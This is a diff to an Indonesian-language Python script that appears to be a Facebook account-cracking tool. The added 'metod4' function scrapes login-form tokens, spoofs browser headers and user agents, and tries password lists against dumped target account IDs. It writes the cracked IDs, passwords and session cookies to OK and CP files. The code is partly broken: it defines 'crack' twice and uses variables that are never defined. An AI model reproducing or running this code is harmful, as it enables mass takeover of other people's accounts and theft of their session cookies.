@@ -392,7 +392,7 @@ def login_menu():
         massal()
     elif ___Sllowly_ID____ in ['2']:
 	    prints(nel(f'                         [bold blue]Publik Crack')) 
-	    idt = input('✶ ━━⫸ {H2} ID Target{x} : ')
+	    idt = input('✶ ━━⫸ {H} ID Target{N} : ')
 	    dump(idt,"",{"Kue":cok},token)
 	    setting()
     elif ___Sllowly_ID____ in ['3']:
@@ -710,7 +710,7 @@ def setting():
 	if hc in ['1','01']:
 		method.append('metod1')
 	elif hc in ['2','02']:
-		method.append('metod2')
+		method.append('metod4')
 	elif hc in ['3','03']:
 		method.append('metod3')
 	else:
@@ -792,10 +792,23 @@ def passwrd():
 				pool.submit(crackfree,idf,pwv)
 			elif 'metod3' in method:
 				pool.submit(metod3,idf,pwv)
+			elif 'metod4' in method:
+				pool.submit(crack,username,pwv)
 			else:
 				pool.submit(crack,idf,pwv)
-	print(f'[[blue]•]{H2} OK : {H2}%s '%(ok))
-	print(f'[[blue]•]{K2} CP : {K2}%s '%(cp))
+	print('')
+	cetak(nel('\t[cyan][green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
+	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
+	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
+	print('')
+	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
+	woi = input('>> Input : ')
+	if woi in ['y','Y']:
+		kembali()
+	else:
+		print(f'\t{x}>>{k} Jangan lupa pilih prabowo ya{x} << ')
+		time.sleep(2)
+		exit()
 	
 def kembali():
 	prints(f'{B2}Ketik "back" Untuk kembali kemenu crack')
@@ -1370,7 +1383,7 @@ def kontol(idf,pwv):
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{x}[{M2}RR07{x}] | {P}{asu}{loop}{P} | {H}OK-{ok} {P}| {K}CP-{cp}")
+	print(f'\r[{M}RR07{N}] [%s%s]/[%s] {H}Live{N} : %s {K}Check {N} : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
@@ -1413,6 +1426,99 @@ def crack(idf,pwv):
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
 				print(f'\r├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──>  KUKIS : {hh}{kuki}{N}\n└──> UGENT : {u}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+#--------------------[ METODE-MOBILE ]-----------------#
+def crack(username,pwv):
+	global loop,ok,cp
+	bi = random.choice(['\33[m'])
+	pers = loop*100/len(id2)
+	fff = '%'
+	print(f'\r[{M}RR07{N}] [%s%s]/[%s] {H}Live{N} : %s {K}Check {N} : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	bro = random.choice(["com.google.android.captiveportallogin","com.chrome.beta","com.kiwibrowser.browser","org.gnu.icecat","com.cookiegames.smartcookie","com.facebook.lite","com.instagram.barcelona","com.instagram.boomerang","com.mx.browser","com.opera.browser"])
+	ua = random.choice(ugen)
+	get = geturlm()
+	url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
+	post = posturlm()
+	ua = random.choice(ugen)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			link = ses.get(get)
+			data = {
+    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
+    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
+    "try_number": re.search('name="try_number" value="(.*?)"', str(link.text)).group(1),
+    "unrecognized_tries": re.search(
+        'name="unrecognized_tries" value="(.*?)"', str(link.text)
+    ).group(1),
+    "email": username,
+    "prefill_contact_point": "",
+    "prefill_source": "",
+    "prefill_type": "",
+    "first_prefill_source": "",
+    "first_prefill_type": "",
+    "had_cp_prefilled": "true",
+    "had_password_prefilled": "false",
+    "is_smart_lock": "false",
+    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
+    "encpass": "#PWD_BROWSER:0:{}:{}".format(
+        re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1), pw
+    ),
+    "fb_dtsg": "",
+    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
+    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+    "__dyn": "",
+    "__csr": "",
+    "__req": random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
+    "__a": "",
+    "__user": 0,
+}
+
+			yusup = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
+			head = {
+    "Host": url,
+    "accept": "*/*",
+    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+    "content-type": "application/x-www-form-urlencoded",
+    # 'cookie': 'datr=5xlCZcUZoC20eHcjP1RKaq9x; sb=5xlCZQeARAewyul8AgVXu5tI; m_pixel_ratio=1; wd=1348x945; fr=021vFCCZWdLSjl1ME..BlQhnn.ND.AAA.0.0.BlSsdE.AWUz3aQNXS4',
+    "dpr": f"{str(rr(1,5))}",
+    "origin": f"https://"+url,
+    "referer": get,
+    "sec-ch-prefers-color-scheme": "light",
+    "sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
+    "sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-model": '""',
+    "sec-ch-ua-platform": '"Windows"',
+    "sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "user-agent": ua,
+    "viewport-width": f"{str(rr(300,999))}",
+    "x-asbd-id": "129477",
+    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+    "x-requested-with": bro,
+    "x-response-format": "JSONStream",
+}
+			ses.post(post,headers=head,data=data,cookies={'cookie': yusup},allow_redirects=False)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				print(f'\r├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──> UGENT : {U}{ua}{N}')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki = ses.cookies.get_dict()
+				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
+				print(f'\r├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  TAHUN : {hh}{thnb}{N}\n└──>  KUKIS : {hh}{kuki}{N}\n└──> UGENT : {u}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N}')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				break
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
